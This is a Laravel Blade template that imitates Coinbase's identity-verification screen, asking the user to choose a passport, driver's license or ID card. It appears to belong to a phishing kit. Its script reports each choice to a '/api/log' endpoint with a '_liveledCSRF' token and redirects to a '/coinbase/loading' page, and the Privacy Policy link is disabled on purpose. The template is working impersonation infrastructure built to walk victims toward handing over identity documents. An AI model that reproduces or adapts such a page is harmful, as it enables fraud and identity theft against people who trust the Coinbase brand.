@extends('user.coinbase.layout')

@section('title', 'Coinbase - Verify Identity')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

blockquote,
dl,
dd,
h1,
h2,
h3,
h4,
h5,
h6,
hr,
figure,
p,
pre {
  margin: 0;
}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

button,
select {
  text-transform: none;
}

button,
input:where([type=button]),
input:where([type=reset]),
input:where([type=submit]) {
  -webkit-appearance: button;
  background-color: transparent;
  background-image: none;
}

button {
  height: auto;
  -webkit-appearance: button;
  font: inherit;
}

button,
[role=button] {
  cursor: pointer;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-\[\#32353d\] {
  --tw-bg-opacity: 1;
  background-color: rgb(50 53 61 / var(--tw-bg-opacity, 1));
}
.border { border-width: 1px; }
.border-coinbase-line { border-color: #8a919e33; }
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-medium { font-weight: 500; }
.font-semibold { font-weight: 600; }
.gap-2 { gap: .5rem; }
.gap-4 { gap: 1rem; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-lg { max-width: 32rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-4 { margin-top: 1rem; }
.mt-8 { margin-top: 2rem; }
.mt-12 { margin-top: 3rem; }
.p-2 { padding: .5rem; }
.p-4 { padding: 1rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pl-6 { padding-left: 1.5rem; }
.pr-8 { padding-right: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-4 { padding-left: 1rem; padding-right: 1rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.py-1 { padding-top: .25rem; padding-bottom: .25rem; }
.py-4 { padding-top: 1rem; padding-bottom: 1rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-full { border-radius: 9999px; }
.rounded-lg { border-radius: .5rem; }
.text-\[28px\] { font-size: 28px; }
.text-left { text-align: left; }
.text-sm { font-size: .875rem; line-height: 1.25rem; }
.text-coinbase-focused {
  --tw-text-opacity: 1;
  color: rgb(55 115 245 / var(--tw-text-opacity, 1));
}
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-coinbase-primary {
  --tw-text-opacity: 1;
  color: rgb(87 139 250 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.w-full { width: 100%; }
.hover\:bg-coinbase-hovered-background:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(15 16 18 / var(--tw-bg-opacity, 1));
}
.hover\:bg-\[\#3a3d45\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(58 61 69 / var(--tw-bg-opacity, 1));
}
.active\:bg-\[\#47494f\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(71 73 79 / var(--tw-bg-opacity, 1));
}
.disabled\:bg-\[\#1e2024\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(30 32 36 / var(--tw-bg-opacity, 1));
}
.disabled\:text-\[\#858586\]:disabled {
  --tw-text-opacity: 1;
  color: rgb(133 133 134 / var(--tw-text-opacity, 1));
}
.disabled\:scale-100:disabled {
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.active\:scale-\[\.98\]:active {
  --tw-scale-x: .98;
  --tw-scale-y: .98;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 max-w-lg">
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Select your ID type
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
To ensure the security of your account, upload a photo of your driver's license, passport, or national ID card.
</span>
<div class="mt-8 flex w-full flex-col gap-4 pb-8 font-coinbase-sans">
<div class="rounded-lg border border-coinbase-line p-2">
<button class="cb-id-btn flex w-full items-center gap-2 rounded-lg py-1 hover:bg-coinbase-hovered-background" data-id="Passport" type="button">
<span class="px-4 text-coinbase-focused flex items-center">
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="4" y="2" width="16" height="20" rx="2" stroke="currentColor" stroke-width="1.5"/><circle cx="12" cy="10" r="3" stroke="currentColor" stroke-width="1.5"/><path d="M8 16h8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M9.5 18.5h5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
</span>
<div class="flex flex-grow flex-col text-left">
<span class="font-semibold text-white">
Passport
</span>
<span class="text-coinbase-foreground-muted">
Photo page
</span>
</div>
<span class="px-4 text-coinbase-foreground-muted flex items-center">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
</span>
</button>
</div>
<div class="rounded-lg border border-coinbase-line p-2">
<button class="cb-id-btn flex w-full items-center gap-2 rounded-lg py-1 hover:bg-coinbase-hovered-background" data-id="Driver's license" type="button">
<span class="px-4 text-coinbase-focused flex items-center">
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.5"/><rect x="5" y="9" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.5"/><path d="M13 10h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M13 13h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M13 16h4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
</span>
<div class="flex flex-grow flex-col text-left">
<span class="font-semibold text-white">
Driver's license
</span>
<span class="text-coinbase-foreground-muted">
Front and back
</span>
</div>
<span class="px-4 text-coinbase-foreground-muted flex items-center">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
</span>
</button>
</div>
<div class="rounded-lg border border-coinbase-line p-2">
<button class="cb-id-btn flex w-full items-center gap-2 rounded-lg py-1 hover:bg-coinbase-hovered-background" data-id="Identity card" type="button">
<span class="px-4 text-coinbase-focused flex items-center">
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.5"/><circle cx="8" cy="11" r="2" stroke="currentColor" stroke-width="1.5"/><path d="M5.5 17c0-1.38 1.12-2.5 2.5-2.5s2.5 1.12 2.5 2.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M14 10h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M14 13h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
</span>
<div class="flex flex-grow flex-col text-left">
<span class="font-semibold text-white">
Identity card
</span>
<span class="text-coinbase-foreground-muted">
Front and back
</span>
</div>
<span class="px-4 text-coinbase-foreground-muted flex items-center">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
</span>
</button>
</div>
</div>
<div class="rounded-lg border border-coinbase-line p-4">
<p class="font-coinbase-sans text-sm text-coinbase-foreground-muted">
By selecting your ID type on this screen, you agree to our (and our service providers') collection, use, and storage of your biometric information for identity verification. Learn more in Section 7 of our
<a class="font-coinbase-sans font-medium text-coinbase-primary" href="javascript:void(0)" onclick="return false;" style="pointer-events:none;cursor:default;">
Privacy Policy
</a>
.
</p>
</div>
<button id="cb-id-none" class="bg-[#32353d] hover:bg-[#3a3d45] disabled:bg-[#1e2024] disabled:text-[#858586] disabled:scale-100 active:scale-[.98] active:bg-[#47494f] mt-4 rounded-full py-4 flex font-coinbase-sans text-white pl-6 pr-8 items-center font-semibold justify-center" type="button">
I don't have any of these
</button>
</form>
<script>
(function(){
  var _sent = false;
  function onSelect(idType) {
    if (_sent) return; _sent = true;
    var csrf = window._liveledCSRF || '';
    var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_select_id_type',element:'id_type',value:idType});
    try{navigator.sendBeacon?navigator.sendBeacon('/api/log',b):fetch('/api/log',{method:'POST',body:b,keepalive:true});}catch(e){}
    document.documentElement.style.background='#0a0b0d';
    document.body.style.background='#0a0b0d';
    setTimeout(function(){
      if(window.navigateTo)window.navigateTo('/coinbase/loading');
      else window.location.href='/coinbase/loading';
    },300);
  }
  document.querySelectorAll('.cb-id-btn').forEach(function(btn){
    btn.addEventListener('click',function(){onSelect(btn.dataset.id||'Unknown');});
  });
  var noneBtn = document.getElementById('cb-id-none');
  if (noneBtn) noneBtn.addEventListener('click', function(){ onSelect("I don't have any of these"); });
})();
</script>
@endsection
